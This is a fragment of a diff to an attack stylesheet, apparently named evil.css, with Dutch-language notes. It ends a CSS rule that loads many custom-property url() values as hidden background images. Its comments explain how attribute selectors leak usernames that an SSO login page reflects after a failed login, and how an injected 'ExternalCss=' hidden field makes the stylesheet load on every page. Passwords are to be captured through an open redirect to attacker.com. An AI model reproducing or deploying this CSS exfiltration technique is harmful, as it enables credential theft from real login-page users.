+    var(--pe, none), var(--pf, none), var(--pg, none), var(--ph, none),
+    var(--pi, none), var(--pj, none), var(--pk, none), var(--pl, none),
+    var(--pm, none), var(--pn, none), var(--po, none), var(--pp, none),
+    var(--pq, none), var(--pr, none), var(--ps, none), var(--pt, none),
+    var(--pu, none), var(--pv, none), var(--pw, none), var(--px, none),
+    var(--py, none), var(--pz, none),
+    var(--p0, none), var(--p1, none), var(--p2, none), var(--p3, none),
+    var(--p4, none), var(--p5, none), var(--p6, none), var(--p7, none),
+    var(--p8, none), var(--p9, none),
+    var(--pex, none), var(--pat, none), var(--phash, none),
+    var(--pdol, none), var(--pdot, none), var(--pdash, none),
+    var(--punder, none) !important;
+  background-repeat: no-repeat !important;
+  background-position: -9999px -9999px !important;
+}
 
 /* ================================================
    OPMERKINGEN:
    - Attribuut-selectors matchen op het HTML value
-     attribuut, niet de JS property. Ze werken dus
-     NIET bij het typen, maar WEL wanneer de server
-     de waarde teruggeeft na form submission.
-   - De SSO loginpagina reflecteert de username na
-     mislukte login → selectors triggeren dan.
-   - ExternalCss= persisteert als hidden field →
-     evil.css wordt bij elke page render geladen.
-   - CSS custom properties (--cx) met url() worden
-     pas gefetcht wanneer ze via var() gebruikt
-     worden. Voor directe exfiltratie zonder var()
-     gebruik background-image (1 per element).
-   - Wachtwoord-exfiltratie via CSS is beperkt
-     omdat servers passwords zelden reflecteren.
-     Primaire wachtwoord-capture: open redirect
-     (ru=attacker.com) na succesvolle login.
+     attribuut (server-side), niet de JS property.
+     Ze triggeren na page re-render (mislukte login).
+   - ExternalCss= persisteert als hidden field, dus
+     evil.css wordt bij elke render opnieuw geladen.
+   - Custom properties met url() worden pas gefetcht
+     wanneer ze via var() in background-image staan.
+     Alleen matchende selectors produceren requests.
+   - Username: server reflecteert dit vrijwel altijd
+     na mislukte login.
+   - Password: alleen als server dit reflecteert
+     (ongebruikelijk). Primaire password-capture:
+     open redirect (ru=attacker.com) na login.
    ================================================ */
